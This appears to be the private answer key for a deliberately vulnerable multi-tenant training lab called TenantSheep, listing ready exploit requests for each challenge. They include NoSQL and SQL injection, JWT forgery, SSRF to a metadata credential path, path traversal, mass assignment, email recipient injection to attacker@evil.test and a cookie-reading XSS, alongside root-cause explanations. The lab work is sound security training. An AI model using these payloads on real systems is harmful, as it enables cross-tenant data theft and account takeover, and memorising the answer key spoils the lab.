# TenantSheep Solutions

Your own reference. Don't publish this file alongside the public repo if
you post TenantSheep anywhere — the challenge list without answers is the
public-facing version.

## secondary-api

**1. Cross-tenant campaign search**
`GET /api/campaigns/search?filter={"orgId":{"$ne":null}}`
The user-supplied filter is merged onto the base query *after* `orgId`,
so a filter that includes its own `orgId` key overwrites the tenant scope
entirely. Root cause: `Object.assign({orgId: ...}, userFilter)` — argument
order matters in `Object.assign`, later sources win.

**2. Campaign detail IDOR**
`GET /api/campaigns/<any campaign _id from another org>` — the route
never filters by `orgId` at all. List campaigns as org A, note org B's
IDs from challenge 1, fetch them directly.

**3. Legacy preview route**
`jwt.decode()` performs no signature verification. Base64-encode any
header + a payload like `{"orgId":"<any id>"}` + any third segment and
the route accepts it as-is. You don't need the real secret.

**4. Logo import SSRF**
`POST /api/campaigns/<id>/logo-from-url` with
`{"url": "http://decoy-metadata:1338/latest/meta-data/iam/security-credentials/tenantsheep-demo-role"}`
— the response body echoes back fake IAM credentials, demonstrating the
full SSRF-to-credential-theft chain without touching anything real.

**5. Asset download path traversal**
`GET /api/assets/download?file=../secret.txt` reaches the flag file one
directory above the intended asset root.

## core-api

**1. Project search SQLi**
`GET /api/projects/search?q=x' OR org_id != 1 --` (adjust the org_id to
whichever tenant you're *not* logged in as). The query string is built
with an f-string, not parameterized — `AND name LIKE '%x' OR org_id != 1
--%'` breaks out of the intended clause via operator precedence (`AND`
binds tighter than `OR`).

**2. Missing auth route**
`GET /api/projects/<any id>/raw` — no `Authorization` header needed at
all, no `Depends(get_current_operator)` on the route.

**3. Mass assignment**
`PUT /api/projects/<your own project id>` with body
`{"org_id": <someone else's org>, "status": "whatever"}` — every key in
the body gets applied via `setattr`, including fields that should never
be client-settable.

**4. Celery task injection**
From inside the `core-api` or `create-worker` container:
```python
from tasks import export_project
export_project.delay(project_id=<any id>, org_id=<any fabricated org_id>)
```
No HTTP request, no token, no API call at all — straight to the broker.
The task never re-derives `org_id` from anything authenticated; it trusts
whatever the caller says.

**5. Cross-tenant cache leak**
Log in as Alice, `GET /api/projects/`. Within 30 seconds, log in as Bob
and `GET /api/projects/` — Bob gets Alice's cached result, because the
cache key is the literal string `"projects:list"` with no `org_id` in it
at all.

**6. Structural tenant isolation**
Right now, isolation is enforced only by the application remembering to
add `WHERE org_id = ...` — and challenges 1 and 2 show what happens when
it forgets, or when that clause gets bypassed outright. `rls.sql` shows
the alternative: enforcement at the database layer via `ROW LEVEL
SECURITY`, which keeps working even when the application code doesn't.

## Infra

**nginx.conf**: no `proxy_set_header Transfer-Encoding "";` before
proxying to either backend. A safe reverse-proxy config normalizes or
strips ambiguous `Transfer-Encoding`/`Content-Length` pairs before
forwarding; this one passes them through unexamined.

## secondary-api — stretch items

**6. Invite — extra recipient**
`POST /api/team/invite` with
`{"inviteeEmail": "victim@acme.test\r\nBcc: attacker@evil.test", "inviterName": "Alice"}`
Modern nodemailer *does* block the classic approach here — raw `\r\n` in
the `subject` field gets safely folded, not split into a new header. That
specific attack is patched upstream, confirmed by testing it directly
during the build. What still works: an unvalidated `to` string gets
parsed as RFC 5322 *group* syntax (`"display name": addr-list;`), which
silently includes `attacker@evil.test` as a real second recipient. The
actual bug is the app passing a raw, unvalidated string as the whole `to`
field, not a flaw in nodemailer.

**7. Invite — HTML template injection**
Same endpoint, `{"inviterName": "<img src=x onerror=alert(document.cookie)>", ...}`
The name is interpolated directly into an HTML email body with no
escaping. Confirmed: it passes through nodemailer's MIME composition
completely intact. Stored XSS in any client that renders the email as
HTML.

**8. Profile privilege escalation**
`PUT /api/profile/me` with `{"role": "admin"}` while authenticated as any
operator. `findByIdAndUpdate` applies the whole body with no field
allowlist — same shape as core-api's mass-assignment bug (challenge 3
there), recurring in a different file.

**9. Host header tenant enumeration**
`curl -H "Host: acme.tenantsheep.test" http://localhost:4000/api/public/status`
No token needed. Swap the Host header to enumerate other orgs by name —
`borealis.tenantsheep.test`, etc. — and see their active campaigns.

**10. Presigned URL scoping**
`POST /api/storage/<campaign id>/upload-url` with `{"filename": "logo.png"}`
returns a MinIO presigned PUT URL valid for 24 hours, keyed only by the
raw filename — no `orgId/` prefix. Any operator from any org who guesses
or learns a predictable filename (`logo.png`, `export.zip`, `brief.pdf`)
can read or overwrite another tenant's object within that window using
`GET /api/storage/download-url?key=logo.png`.

## core-api — stretch item

**7. Staging/prod drift**
`GET /health` returns `{"debug_mode": true}` by default. With `DEBUG=true`
(the default, meant to represent a staging-like posture): `/docs` and
`/redoc` are live, CORS allows any origin, and an unhandled exception
returns a full Python traceback in the response body. Set `DEBUG=false`
in `docker-compose.yml` and restart `core-api` — all three close at
once. This is the exact drift SoW section 4.2 asks you to confirm between
environments, made directly comparable with one flag instead of needing
access to two real deployments.
